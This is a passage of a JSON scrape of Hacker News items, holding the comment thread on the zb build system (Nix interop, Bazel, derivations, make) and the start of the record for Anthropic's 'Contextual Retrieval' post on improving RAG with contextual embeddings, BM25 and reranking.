    "commentLink": "https://news.ycombinator.com/item?id=41595310",
    "commentBody": "Zb: An Early-Stage Build System (zombiezen.com)233 points by zombiezen 23 hours agohidepastfavorite102 comments mikepurvis 22 hours agoWhoa, nifty. Can you speak more to the interop issues with Nix? I've been working on a pretty large Nix deployment in the robotics space for the past 3ish years, and the infrastructure side is the biggest pain point: * Running a bare `nix build` in your CI isn't really enough— no hosted logs, lack of proper prioritization, may end up double-building things. * Running your own instance of Hydra is a gigantic pain; it's a big ball of perl and has compiled components that link right into Nix internals, and architectural fiasco. * SaaS solutions are limited and lack maturity (Hercules CI is Github-only, nixbuild.net is based in Europe and last I checked was still missing some features I needed). * Tvix is cool but not ready for primetime, and the authors oppose flakes, which is a deal-breaker for me. Something that's a barebones capable of running these builds and could be wrapped in a sane REST API and simple web frontend would be very appealing. reply zombiezen 21 hours agoparentTracking issue is https://github.com/256lights/zb/issues/2 The hurdles to interop I see are: - Nixpkgs is not content-addressed (yet). I made a conscious decision to only support content-addressed derivations in zb to simplify the build model and provide easier-to-understand guarantees to users. As a result, the store paths are different (/zb/store instead of /nix/store). Which leads to... - Nix store objects have no notion of cross-store references. I am not sure how many assumptions are made on this in the codebases, but it seems gnarly in general. (e.g. how would GC work, how do you download the closure of a cross-store object, etc.) - In order to obtain Nixpkgs derivations, you need to run a Nix evaluator, which means you still need Nix installed. I'm not sure of a way around this, and seems like it would be a hassle for users. I have experienced the same friction in build infra for Nix. My hope is that by reusing the binary cache layer and introducing a JSON-RPC-based public API (already checked in, but needs to be documented and cleaned up) for running builds that the infrastructure ecosystem will be easier. reply flurie 22 hours agoparentprevI've been wondering idly if it's possible for Nix to support the Bazel Remote Execution API that seems to be catching on[1] more generally. [1] https://github.com/bazelbuild/remote-apis?tab=readme-ov-file... reply mikepurvis 19 hours agorootparentI’m very interested in better bidirectional interop between bazel and nix; it seems such a travesty that for two projects that are so ideologically aligned to work so poorly together. Nix should be able to run builds on bazel and bazel builds should decompose and cache into multiple store paths in a nix environment (think how poetry2nix works). reply flurie 18 hours agorootparentIf you're attending BazelCon I'd love to have a chat with you about this stuff in some more detail. (If you're not I'd still love to have a chat!) reply mikepurvis 4 hours agorootparentI'm afraid I'm not planning on it; I don't make it to the west coast nearly as often as I should. Feel free to hmu on LinkedIn or something though; I'd love to get plugged into some people interested in this stuff, and I'm about to have a block of time available when I could potentially work on it. reply Rucadi 22 hours agoparentprevWhy are flakes such a deal-breaker? While not ideal, you can still tag your versions in the .nix file instead of the lockfile. I even had to avoid flakes in a system I developed used by ~200 developers since it involved a non-nixos OS and it involved user secrets (Tokens etc...) So with flakes I had to keep track of the secrets (and was a pain point, since they obviously didn't have to push them into the git repo) but nix flakes doesn't handle well omitting files on git (it ignores them also on nix commands). In the end, the workarounds were too messy and had to drop flakes entirely. reply mikepurvis 19 hours agorootparentAs a new user, I learned flakes first, and the tie-in with git tags/branches and the corresponding cli ergonomics aren’t something I’d be able to give up. reply JasonSage 52 minutes agorootparentHow do you handle flakes pushing an entire copy of the repo into the nix store? Is this not an issue for you somehow? reply xyzsparetimexyz 19 hours agoparentprevhttps://github.com/edolstra/flake-compat should make flakes work with tvix reply bjourne 3 hours agoprevI've been using WAF for ages so naturally I wonder how this system compares to WAF? My experience with build systems is that they all get the easy parts rights. You can compile C and C++ code and they successfully scan header files for dependencies. But FEW get the hard parts rights. E.g., compiling LaTeX with multiple figures, custom fonts and classes, and multiple bib files. It requires correctly interfacing with pdfatex which is a complete PITA as it spews intermediate files everywhere and puts constraints on the current directory. Most build tools can't. What I want in a build tool is universality. Sometimes a whole directory tree is the dependency of a target. Sometimes it's an url and the build tool should correctly download and cache that url. Sometimes the pre-requisite is training an ML model. reply rwmj 6 minutes agoparentI wrote an experimental make replacement some years ago that understands that not every target is a file. eg. You can have targets be a remote URL (for an action of uploading to a fileserver). http://git.annexia.org/?p=goals.git;a=summary http://oirase.annexia.org/2020-02-rjones-goals-tech-talk.mp4 reply laurentlb 22 hours agoprevI'd like to know more about the \"Support for non-determinism\" and how that differs from other build systems. Usually, build systems rerun actions when at least one of the inputs has changed. Are non-deterministic targets rerun all the time? Also, I'm curious to know if you've considered using Starlark or the build file syntax used in multiple other recent build systems (Bazel, Buck, Please, Pants). reply zombiezen 21 hours agoparent(Hi! I recognize your name from Bazel mailing lists but I forget whether we've talked before.) I'm mostly contrasting from Nix, which has difficulty with poisoning cache when faced with non-deterministic build steps when using input-addressing (the default mode). If zb encounters a build target with multiple cached outputs for the same inputs, it rebuilds and then relies on content-addressing to obtain build outputs for subsequent steps if possible. (I have an open issue for marking a target as intentionally non-deterministic and always triggering this re-run behavior: https://github.com/256lights/zb/issues/33) I'll admit I haven't done my research into how Bazel handles non-determinism, especially nowadays, so I can't remark there. I know from my Google days that even writing genrules you had to be careful about introducing non-determinism, but I forget how that failure mode plays out. If you have a good link (or don't mind giving a quick summary), I'd love to read up. I have considered Starlark, and still might end up using it. The critical feature I wanted to bolt in from Nix was having strings carrying dependency information (see https://github.com/NixOS/nix/blob/2f678331d59451dd6f1d9512cb... for a description of the feature). In my prototyping, this was pretty simple to bolt on to Lua, but I'm not sure how disruptive that would be to Starlark. Nix configurations tend to be a bit more complex than Bazel ones, so having a more full-featured language felt more appropriate. Still exploring the design space! reply aseipp 18 hours agorootparentI mean, to be fair, Nix is nothing more than a big ass pile of genrule() calls, at the end of the day. Everything is really just genrule. Nix just makes it all work with the sandbox it puts all builds in. Bazel has an equivalent sandbox and I'm pretty sure you can sandbox genrule so it's in a nice, hermetic container. (Side note, but one of my biggest pet peeves is that Nix without the sandbox is actually fundamentally _broken_, yet we let people install it without the sandbox. I have no idea why \"Install this thing in a broken way!\" is even offered as an option. Ridiculous.) The way Nix-like systems achieve hermetic sandboxing isn't so much a technical feat, in my mind. That's part of it -- sure, you need to get rid of /dev devices, and every build always has to look like it happens at /tmp/build within a mount namespace, and you need to set SOURCE_EPOCH_DATE and blah blah, stuff like that. But it's also a social one, because with Nix you are expected to wrap arbitrary build systems and package mechanisms and \"go where they are.\" That means you have to bludgeon every random hostile badly written thing into working inside the sandbox you designed, carve out exceptions, and write ptaches for things that don't -- and get them working in a deterministic way. For example, you have to change the default search paths for nearly every single tool to look inside calculated Nix store path. That's not a technical feat, it's mostly just a huge amount of hard work to write all the abstractions, like buildRustPackage or makeDerivation. You need to patch every build system like CMake or Scons in order to alleviate some of their assumptions, and so on and so forth. Bazel and Buck like systems do not avoid this pain but they do pay for it in a different way. They don't \"go where they are\", they expect everyone to \"come to them.\" Culturally, Bazel users do not accept \"just run Make under a sandbox\" nearly as much. The idea is to write everything as a BUILD file rule, from scratch rewriting the build system, and those BUILD files instead should perform the build \"natively\" in a way that is designed to work hermetically. So you don't run ./configure, you actually pick an exact set of configuration options and build with that 100% of the time. Therefore, the impurities in the build are removed \"by design\", which makes the strict requirements on a sandbox somewhat more lenient. You still need the sandbox, but by definition your builds are much more robust anyway. So you are trading the pain of wrapping every system for the pain of integrating every system manually. They're not the same thing but have a lot of overlap. So the answer is, yes you can write impure genrules, but the vast majority of impurity is totally encapsulated in a way that forces it to be pure, just like Nix, so it's mostly just a small nit rather than truly fundamental. The real question is a matter of when you want to pay the pied piper. reply kaba0 10 hours agorootparentYou (plural) seem to know a great deal about build systems, so I figured I would ask - what’s your opinion about Mill? It’s a not so well known build tool written in scala, but I find its underlying primitives are absolutely on point. For those who don’t know, its build descriptors are just Scala classes with functions. A function calling another function denotes a dependency, and that’s pretty much it. The build tool will automatically take care of parallelizing build steps and caching them. How do you think it relates to Nix and alia on a technical level? reply msvan 22 hours agoprevAs a current Nix user, what I would really like is a statically typed language to define builds. Recreating Nix without addressing that feels like a missed opportunity. reply zombiezen 22 hours agoparentThe Lua VSCode extension adds a type system that works really well IME reply 0cf8612b2e1e 22 hours agorootparentThere are Lua flavors with typing. Teal is one I have heard that compiles down to regular Lua like a typescript reply Rucadi 22 hours agoparentprevFor me the killer feature is Windows Support, Ericsson is doing a great job bringing nix into Windows, but the process it's understandably slow, If this project is similar enough to nix that I can kind-off translate easily the zb derivations to nix derivations, I'm willing to use it in windows (It's not like nix has windows programs in the nixpkgs either way I have to bring them in my own). The problem for me is that I see no benefit on using this over nix language (which I kinda like a lot right now) reply droelf 22 hours agorootparentWe're working on rattler-build (https://github.com/prefix-dev/rattler-build/) - which is a build system inspired by Apko / conda-build and uses YAML files to statically define dependencies. It works really well with pixi (our package manager) but also any other conda compatible package managers (mamba, conda). And it has Windows support, of course. It can also be used to build your own distribution (e.g. here is one for a bunch of Rust utilities: https://github.com/wolfv/rust-forge) reply hamandcheese 21 hours agorootparentprev> Ericsson is doing a great job bringing nix into Windows Is this Ericsson... the corporation? Windows support for nix is something I don't hear much about, but if there is progress being made (even slowly) I'd love to know more. reply Rucadi 21 hours agorootparentJohn Ericson (@Ericson2314) You can read a post on that here: https://lastlog.de/blog/libnix_roadmap.html reply jjuliano 2 hours agoprevI made a graph-based orchestrator - https://github.com/jjuliano/runner - It uses declarative YAML, and preflight, postflight and skip conditions. I think it can also be a full-fledge build system. reply Iceland_jack 23 hours agoprevI appreciate the link to https://dl.acm.org/doi/10.1145/3236774 reply o11c 21 hours agoparentDefinitely interesting, but it's flat-out wrong about the limitations of `make`. In particular, the `release.txt` task is trivial by adding a dummy rule to generate and include dependencies; see https://www.gnu.org/software/make/manual/html_node/Remaking-... (be sure to add empty rules to handle the case of deleted dynamic dependencies). You can use hashes instead of file modification times by adding a different kind of dummy rule. The only downside is that you have to think about the performance a little. I imagine it's possible for a project to have some kind of dynamic dependencies that GNU make can't handle, but I dare say that any such dependency tree is hard to understand for humans too, and thus should be avoided regardless. By contrast, in many other build tools it is impossible to handle some of the things that are trivial in `make`. (if you're not using GNU make, you are the problem; do not blame `make`) reply bjourne 3 hours agorootparentI guess you aren't keen on Java then? Complex dynamic dependency graphs aren't difficult for humans to handle or many build tools other than make. reply evanjrowley 23 hours agoprevThis looks really exciting and I absolutely must give it a try. Well done! At face value the vision and design choices appear to be great. reply zombiezen 23 hours agoparentThank you! -hello/bin”. nix will do the fetching and storing for you. so you can have “command $hello” in your script. neat! play around with evaluating the ‘derivation’ built-in function. reply umanwizard 18 hours agorootparentprevWhat’s wrong with it? It’s a term of art that means a specific thing in both nix and guix; it’d just be confusing if zb renamed it to something else. reply kstenerud 16 hours agorootparentI'm 80% finished moving all of my servers from NixOS to Debian. I used NixOS for 3 years (even wrote some custom flakes) before finally giving up (for the final year I was just too scared to touch it, and then said \"I shouldn't be scared of my OS\"). I should know what \"derivation\" means, but I can't for the life of me remember... reply umanwizard 13 hours agorootparentI don’t know Nix, but I’ll describe how Guix works, and hopefully it will be obvious what the corresponding Nix concepts are. A “package” is a high-level description (written in scheme) of how to build something, like: “using the GNU build system with inputs a, b, c, and configure flags x, y, z, build the source available at https://github.com/foo/bar” The actual builder daemon doesn’t know about the GNU build system, or how to fetch things from GitHub, or how to compute nested dependencies, etc.; it is very simple. All it knows is how to build derivations, which are low-level descriptions of how to build something: “create a container that can see paths a, b, and c (which are themselves other derivations or files stored in the store and addressed by their hash), then invoke the builder script x.” So when you ask guix to build something, it reads the package definition, finds the source and stores it in the store, generates the builder script (which is by convention usually also written in scheme, though theoretically nothing stops you from defining a package whose builder was written in some other language), computes the input derivation paths, etc., and ultimately generates a derivation which it then asks the daemon to build. I believe in Nix, rather than scheme, packages are written in nix lang and builder scripts can be written in any language but by convention are usually bash. So basically long story short, the package is the higher-level representation on the guix side, and the derivation is the lower-level representation on the guix-daemon side. reply Modified3019 15 hours agorootparentprevYeah I ended up with the same issue. While I’m technically inclined, I’m not nearly to the point where I can handle the fire hose of (badly named) abstraction at all levels like some people. I could never have pulled off what this guy did https://roscidus.com/blog/blog/2021/03/07/qubes-lite-with-kv..., though ironically his journal is probably one of the best “how nix actually works” tutorials I’ve ever seen, even though it isn’t intended for that or complete for such a purpose. He’s the only reason I know that a derivation is basically an intermediate build object. reply smilliken 15 hours agorootparentprev\"Derivation\" refers to the nix intermediate build artifact, a .drv file, which contains the instructions to perform the build itself. Basically a nix program compiles to a derivation file which gets run to produce the build outputs. The hash in the /nix/store for a dependency is the hash of the derivation. Conveniently if the hash is already in a build cache, you can download the cached build outputs instead of building it yourself. reply kstenerud 15 hours agorootparentAh OK, then I'd actually never actually understood what a derivation is. But then again, the name \"derivation\" doesn't at all lead to guessing at such a definition, either. reply umanwizard 10 hours agorootparent“Build plan” would maybe be a more obvious name, but it’d still be confusing to deviate from what Nox uses, IMO. reply nurettin 12 hours agorootparentprevIt is the name of a feature in Nix. This is as obfuscated as calling a rock a rock. reply pdimitar 12 hours agorootparentStrange thing to say but you do you. I tried to dabble in Nix several times and the term never stuck. I suppose for you it's impossible to accept that the term is just bad and unintuitive. And other comments here say the same. reply nurettin 6 hours agorootparentI mean it has variable names, configurations, documentation, a file extension and lots of code and a history behind it, so the strange thing to me is trying to suggest a replacement phrase as if you don't know what it is, acting like it's some high-brow language used in a blog to look smart, complaining about how this makes it less accessible (paraphrasing a little), then rolling back saying you dabbled in Nix and acting like you know what it is. But then, you do you. reply pdimitar 6 hours agorootparentThe part you seem to deliberately miss is that what is obvious to people deeply invested in Nix is not obvious to anyone else. I for one can't trace the train of thought that is going from \"intermediate build artifact\" and somehow arrives at \"derivation\". I found out just enough about Nix to reject it. My take is still informed, I simply didn't buy its pitch. reply nurettin 6 hours agorootparentI geniunely thought you knew nothing about derivations and were criticizing the blogger for writing the term in their blog, not the term standard to Nix itself. Which is just as weird to me as complaining about std::string, well why call it a string? it is obviously text! reply imiric 3 hours agorootparent> Which is just as weird to me as complaining about std::string, well why call it a string? it is obviously text! It's really not, though. String is a common technical term used in programming languages for many decades. If a new language decided to call them \"textrons\", _that_ would be weird. And this is the exact thing Nix did with \"derivations\", \"flakes\", etc. There is no precedent for these terms in other software, so they're unfamiliar even to its core audience. It would be different if Nix invented an entirely new branch of technology that didn't have any known precedent. But for a reproducible build system that uses a declarative language? C'mon. reply skybrian 20 hours agorootparentprevOne thing I like to see is a 'dry run' like 'make -n'. Although, maybe that's not possible in all cases. Another possibility might be to output a something like a shell script that would do a rebuild the same way, so you can see what it did and hack it when debugging. reply photonthug 18 hours agorootparentYes. Dry runs at least, and better yet terraform-style planning that produces an artifact that can be applied. These should really be more common with all kinds of software reply hinkley 18 hours agorootparentI would like to see more tools iterate on trying to do terraform-like output because while terraform diffs are interesting, practically most of my teammates couldn’t tell what the fuck they said and a couple times I missed important lines that caused us prod issues. I think we can do a better job than showing a wall of text. reply photonthug 17 hours agorootparentPresentation is a separate matter though, just like with git diffs ideally you could choose a wall of text or a side by side ui, see things at a high level or drill down to line by line. A tag layer plus custom validation between plan/apply gives you an automatic way to short circuit things. But none of it can work without a plan as a first class object. Thing is the plan/apply split isn’t even primarily for users necessarily, it’s just good design. It makes testing easier, and leaves open the possibility for plugging in totally different resolution strategies without rewriting the whole core. The benefits are so big there that I’d strongly prefer that more software is using it more often, even if I’m going to shut my eyes and auto apply every time without glancing at the plan. reply kortex 20 hours agoparentprev> The goal of supporting non-deterministic builds also seems to go against this. I think this is actually a great escape hatch. Supporting non-deterministic builds means more folks will be able to migrate their existing build to zb. Postel's law and all that. reply imiric 13 hours agorootparentRight, could be. One of the insane things with Nix is that the suggested workflow is to manage _everything_ with it. This means that it wants to replace every package manager in existence, so you see Python, Emacs and other dependency trees entirely replicated in Nix. As well as every possible configuration format. It's craziness... Now I don't need to depend on just the upstream package, I also have to wait for these changes to propagate to Nix packages. And sometimes I just want to do things manually as a quick fix, instead of spending hours figuring out why the Nix implementation doesn't work. So, yeah, having an escape hatch that allows easier integration with other ecosystems or doing things manually in some cases, would be nice to have. reply sweeter 16 hours agoparentprevI thought of creating something similar and I was going to use a personal fork of the Go compiler with some mods, anko (which is a really cool go binding language) or righting my own DSL. It's quite the undertaking. I like Nix and NixOS a lot, its really cool, but it has some really odd management issues and the language IMO is horrendous. I used NixOS for around a year and I was changing my Nixpkgs version and I got that same generic nonsense error that doesn't have any semantic meaning and I was just over it. I'm not too fond of commenting out random parts of code to figure out where something minor and obscure failed. Sometimes it tells you the module it had a problem with, or will point out an out of place comma, and other times its just like \"idk bruh ¯\\_(ツ)_/¯ \"failed at builtin 'seq'\" is the best I can do\" the paradigm is a million dollar idea though. I have no doubt its the future of a large portion of the future, both for programming and generic systems. I just wish it wasn't a pain to write and it had some sensible error handling. reply danmur 13 hours agorootparentThe language has grown on me a bit. I initially hated it but a lot of my pain was not actually the language but the lack of good docs for the standard library. Still struggle with the tracebacks though. It's painful when things go wrong. reply aseipp 18 hours agoprevWhatever choices this project makes (I have some opinions, but I think they're not too important) I don't see it mentioning one of the most absolutely critical choices Nix made that was absolutely key to its insane success (at least, IMO, as a hardcore contributor and user for like 10+ years): the monorepo, containing all of the packages and all the libraries for use by everyone downstream, and all contributions trying to go there. Please do not give into the temptation to just write a version manager and stitch together some hodgepodge and throw the hard problem over the fence to the \"community\", a set of balkanized repositories to make everything work. It is really really really hard to overstate how much value Nixpkgs gets from going the monorepo route and how much the project has been able to improve, adapt, and overcome things thanks to it. It feels like Nixpkgs regularly pulls off major code-wide changes on an average Tuesday that other projects would balk at. (It's actually a benefit early on to just keep everything in one repo too, because you can just... clean up all the code in one spot if you do something like make a major breaking change. Huge huge benefit!) Finally: as a die hard Nix user, I also have been using Buck2 as a kind of thing-that-is-hermetic-cloud-based-and-supports-Windows tool, and it competes in the same space as Zb; a monorepo containing all BUILD files is incredibly important for things to work reliably and it's what I'm exploring right now and seeing if that can be viable. I'm even exploring the possibility of starting from stage0-posix as well. Good luck! There's still work to be done in this space and Nix isn't the final answer, even if I love it. reply theLiminator 13 hours agoparentBuck2 looks very principled. Will definitely be interesting as it gets mature in the open source world. I'm personally convinced monorepo is strictly superior (provided you have the right tooling to support it). reply nvlled 8 hours agoprev [–] https://github.com/256lights/zb/blob/102795d6cb383a919dd378d... TIL I can also use semicolons on lua tables, not just commas: return derivation { name = \"hello.txt\"; [\"in\"] = path \"hello.txt\"; builder = \"/bin/sh\"; system = \"x86_64-linux\"; args = {\"-c\", \"while read line; do echo \\\"$line\\\"; done$out\"}; } I like using lua as a DSL, now I like it even more! I've using lua as a html templating language that looks like this: DIV { id=\"id\"; class=\"class; H1 \"heading\"; P [[ Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor ]] / EM incididunt / [[ ut labore et dolore magna aliqua. ]]; PRE ^ CODE [[ this istag inside]]; } reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "zb is an early-stage build system developed by Roxy Light, aimed at user-friendly reproducible builds and dependency management.",
      "Key features include a familiar Lua scripting language, powerful build capabilities, support for non-deterministic builds, compatibility with Nix, and cross-platform support (Windows, Linux, macOS).",
      "zb has reached a significant milestone by no longer depending on Nix, with a new backend supporting content-addressed derivations and the \"Intensional Model\" from The Purely Functional Software Deployment Model."
    ],
    "commentSummary": [
      "Zb is an early-stage build system designed to simplify the build model by supporting only content-addressed derivations, differing from Nix's approach.",
      "The system aims to address interoperability issues with Nix, such as the lack of cross-store references and the need for a Nix evaluator to obtain Nixpkgs derivations.",
      "Zb introduces a JSON-RPC-based public API for running builds, which could potentially make the infrastructure ecosystem easier to manage and integrate."
    ],
    "points": 233,
    "commentCount": 102,
    "retryCount": 0,
    "time": 1726773364
  },
  {
    "id": 41598119,
    "title": "Contextual Retrieval",
    "originLink": "https://www.anthropic.com/news/contextual-retrieval",
    "originBody": "ProductAnnouncements Introducing Contextual Retrieval Sep 19, 2024●10 min read For an AI model to be useful in specific contexts, it often needs access to background knowledge. For example, customer support chatbots need knowledge about the specific business they're being used for, and legal analyst bots need to know about a vast array of past cases. Developers typically enhance an AI model's knowledge using Retrieval-Augmented Generation (RAG). RAG is a method that retrieves relevant information from a knowledge base and appends it to the user's prompt, significantly enhancing the model's response. The problem is that traditional RAG solutions remove context when encoding information, which often results in the system failing to retrieve the relevant information from the knowledge base. In this post, we outline a method that dramatically improves the retrieval step in RAG. The method is called “Contextual Retrieval” and uses two sub-techniques: Contextual Embeddings and Contextual BM25. This method can reduce the number of failed retrievals by 49% and, when combined with reranking, by 67%. These represent significant improvements in retrieval accuracy, which directly translates to better performance in downstream tasks. You can easily deploy your own Contextual Retrieval solution with Claude with our cookbook. A note on simply using a longer prompt Sometimes the simplest solution is the best. If your knowledge base is smaller than 200,000 tokens (about 500 pages of material), you can just include the entire knowledge base in the prompt that you give the model, with no need for RAG or similar methods. A few weeks ago, we released prompt caching for Claude, which makes this approach significantly faster and more cost-effective. Developers can now cache frequently used prompts between API calls, reducing latency by > 2x and costs by up to 90% (you can see how it works by reading our prompt caching cookbook). However, as your knowledge base grows, you'll need a more scalable solution. That’s where Contextual Retrieval comes in. A primer on RAG: scaling to larger knowledge bases For larger knowledge bases that don't fit within the context window, RAG is the typical solution. RAG works by preprocessing a knowledge base using the following steps: Break down the knowledge base (the “corpus” of documents) into smaller chunks of text, usually no more than a few hundred tokens; Use an embedding model to convert these chunks into vector embeddings that encode meaning; Store these embeddings in a vector database that allows for searching by semantic similarity. At runtime, when a user inputs a query to the model, the vector database is used to find the most relevant chunks based on semantic similarity to the query. Then, the most relevant chunks are added to the prompt sent to the generative model. While embedding models excel at capturing semantic relationships, they can miss crucial exact matches. Fortunately, there’s an older technique that can assist in these situations. BM25 (Best Matching 25) is a ranking function that uses lexical matching to find precise word or phrase matches. It's particularly effective for queries that include unique identifiers or technical terms. BM25 works by building upon the TF-IDF (Term Frequency-Inverse Document Frequency) concept. TF-IDF measures how important a word is to a document in a collection. BM25 refines this by considering document length and applying a saturation function to term frequency, which helps prevent common words from dominating the results. Here’s how BM25 can succeed where semantic embeddings fail: Suppose a user queries \"Error code TS-999\" in a technical support database. An embedding model might find content about error codes in general, but could miss the exact \"TS-999\" match. BM25 looks for this specific text string to identify the relevant documentation. RAG solutions can more accurately retrieve the most applicable chunks by combining the embeddings and BM25 techniques using the following steps: Break down the knowledge base (the \"corpus\" of documents) into smaller chunks of text, usually no more than a few hundred tokens; Create TF-IDF encodings and semantic embeddings for these chunks; Use BM25 to find top chunks based on exact matches; Use embeddings to find top chunks based on semantic similarity; Combine and deduplicate results from (3) and (4) using rank fusion techniques; Add the top-K chunks to the prompt to generate the response. By leveraging both BM25 and embedding models, traditional RAG systems can provide more comprehensive and accurate results, balancing precise term matching with broader semantic understanding. A Standard Retrieval-Augmented Generation (RAG) system that uses both embeddings and Best Match 25 (BM25) to retrieve information. TF-IDF (term frequency-inverse document frequency) measures word importance and forms the basis for BM25. This approach allows you to cost-effectively scale to enormous knowledge bases, far beyond what could fit in a single prompt. But these traditional RAG systems have a significant limitation: they often destroy context. The context conundrum in traditional RAG In traditional RAG, documents are typically split into smaller chunks for efficient retrieval. While this approach works well for many applications, it can lead to problems when individual chunks lack sufficient context. For example, imagine you had a collection of financial information (say, U.S. SEC filings) embedded in your knowledge base, and you received the following question: \"What was the revenue growth for ACME Corp in Q2 2023?\" A relevant chunk might contain the text: \"The company's revenue grew by 3% over the previous quarter.\" However, this chunk on its own doesn't specify which company it's referring to or the relevant time period, making it difficult to retrieve the right information or use the information effectively. Introducing Contextual Retrieval Contextual Retrieval solves this problem by prepending chunk-specific explanatory context to each chunk before embedding (“Contextual Embeddings”) and creating the BM25 index (“Contextual BM25”). Let’s return to our SEC filings collection example. Here's an example of how a chunk might be transformed: original_chunk = \"The company's revenue grew by 3% over the previous quarter.\" contextualized_chunk = \"This chunk is from an SEC filing on ACME corp's performance in Q2 2023; the previous quarter's revenue was $314 million. The company's revenue grew by 3% over the previous quarter.\" It is worth noting that other approaches to using context to improve retrieval have been proposed in the past. Other proposals include: adding generic document summaries to chunks (we experimented and saw very limited gains), hypothetical document embedding, and summary-based indexing (we evaluated and saw low performance). These methods differ from what is proposed in this post. Implementing Contextual Retrieval Of course, it would be far too much work to manually annotate the thousands or even millions of chunks in a knowledge base. To implement Contextual Retrieval, we turn to Claude. We’ve written a prompt that instructs the model to provide concise, chunk-specific context that explains the chunk using the context of the overall document. We used the following Claude 3 Haiku prompt to generate context for each chunk:{{WHOLE_DOCUMENT}}Here is the chunk we want to situate within the whole document{{CHUNK_CONTENT}}Please give a short succinct context to situate this chunk within the overall document for the purposes of improving search retrieval of the chunk. Answer only with the succinct context and nothing else. The resulting contextual text, usually 50-100 tokens, is prepended to the chunk before embedding it and before creating the BM25 index. Here’s what the preprocessing flow looks like in practice: Contextual Retrieval is a preprocessing technique that improves retrieval accuracy. If you’re interested in using Contextual Retrieval, you can get started with our cookbook. Using Prompt Caching to reduce the costs of Contextual Retrieval Contextual Retrieval is uniquely possible at low cost with Claude, thanks to the special prompt caching feature we mentioned above. With prompt caching, you don’t need to pass in the reference document for every chunk. You simply load the document into the cache once and then reference the previously cached content. Assuming 800 token chunks, 8k token documents, 50 token context instructions, and 100 tokens of context per chunk, the one-time cost to generate contextualized chunks is $1.02 per million document tokens. Methodology We experimented across various knowledge domains (codebases, fiction, ArXiv papers, Science Papers), embedding models, retrieval strategies, and evaluation metrics. We’ve included a few examples of the questions and answers we used for each domain in Appendix II. The graphs below show the average performance across all knowledge domains with the top-performing embedding configuration (Gemini Text 004) and retrieving the top-20-chunks. We use 1 minus recall@20 as our evaluation metric, which measures the percentage of relevant documents that fail to be retrieved within the top 20 chunks. You can see the full results in the appendix - contextualizing improves performance in every embedding-source combination we evaluated. Performance improvements Our experiments showed that: Contextual Embeddings reduced the top-20-chunk retrieval failure rate by 35% (5.7% → 3.7%). Combining Contextual Embeddings and Contextual BM25 reduced the top-20-chunk retrieval failure rate by 49% (5.7% → 2.9%). Combining Contextual Embedding and Contextual BM25 reduce the top-20-chunk retrieval failure rate by 49%. Implementation considerations When implementing Contextual Retrieval, there are a few considerations to keep in mind: Chunk boundaries: Consider how you split your documents into chunks. The choice of chunk size, chunk boundary, and chunk overlap can affect retrieval performance1. Embedding model: Whereas Contextual Retrieval improves performance across all embedding models we tested, some models may benefit more than others. We found Gemini and Voyage embeddings to be particularly effective. Custom contextualizer prompts: While the generic prompt we provided works well, you may be able to achieve even better results with prompts tailored to your specific domain or use case (for example, including a glossary of key terms that might only be defined in other documents in the knowledge base). Number of chunks: Adding more chunks into the context window increases the chances that you include the relevant information. However, more information can be distracting for models so there's a limit to this. We tried delivering 5, 10, and 20 chunks, and found using 20 to be the most performant of these options (see appendix for comparisons) but it’s worth experimenting on your use case. Always run evals: Response generation may be improved by passing it the contextualized chunk and distinguishing between what is context and what is the chunk. Further boosting performance with Reranking In a final step, we can combine Contextual Retrieval with another technique to give even more performance improvements. In traditional RAG, the AI system searches its knowledge base to find the potentially relevant information chunks. With large knowledge bases, this initial retrieval often returns a lot of chunks—sometimes hundreds—of varying relevance and importance. Reranking is a commonly used filtering technique to ensure that only the most relevant chunks are passed to the model. Reranking provides better responses and reduces cost and latency because the model is processing less information. The key steps are: Perform initial retrieval to get the top potentially relevant chunks (we used the top 150); Pass the top-N chunks, along with the user's query, through the reranking model; Using a reranking model, give each chunk a score based on its relevance and importance to the prompt, then select the top-K chunks (we used the top 20); Pass the top-K chunks into the model as context to generate the final result. Combine Contextual Retrieva and Reranking to maximize retrieval accuracy. Performance improvements There are several reranking models on the market. We ran our tests with the Cohere reranker. Voyage also offers a reranker, though we did not have time to test it. Our experiments showed that, across various domains, adding a reranking step further optimizes retrieval. Specifically, we found that Reranked Contextual Embedding and Contextual BM25 reduced the top-20-chunk retrieval failure rate by 67% (5.7% → 1.9%). Reranked Contextual Embedding and Contextual BM25 reduces the top-20-chunk retrieval failure rate by 67%. Cost and latency considerations One important consideration with reranking is the impact on latency and cost, especially when reranking a large number of chunks. Because reranking adds an extra step at runtime, it inevitably adds a small amount of latency, even though the reranker scores all the chunks in parallel. There is an inherent trade-off between reranking more chunks for better performance vs. reranking fewer for lower latency and cost. We recommend experimenting with different settings on your specific use case to find the right balance. Conclusion We ran a large number of tests, comparing different combinations of all the techniques described above (embedding model, use of BM25, use of contextual retrieval, use of a reranker, and total # of top-K results retrieved), all across a variety of different dataset types. Here’s a summary of what we found: Embeddings+BM25 is better than embeddings on their own; Voyage and Gemini have the best embeddings of the ones we tested; Passing the top-20 chunks to the model is more effective than just the top-10 or top-5; Adding context to chunks improves retrieval accuracy a lot; Reranking is better than no reranking; All these benefits stack: to maximize performance improvements, we can combine contextual embeddings (from Voyage or Gemini) with contextual BM25, plus a reranking step, and adding the 20 chunks to the prompt. We encourage all developers working with knowledge bases to use our cookbook to experiment with these approaches to unlock new levels of performance. Appendix I Below is a breakdown of results across datasets, embedding providers, use of BM25 in addition to embeddings, use of contextual retrieval, and use of reranking for Retrievals @ 20. See Appendix II for the breakdowns for Retrievals @ 10 and @ 5 as well as example questions and answers for each dataset. 1 minus recall @ 20 results across data sets and embedding providers. Footnotes 1. For additional reading on chunking strategies, check out this link and this link.",
    "commentLink": "https://news.ycombinator.com/item?id=41598119",
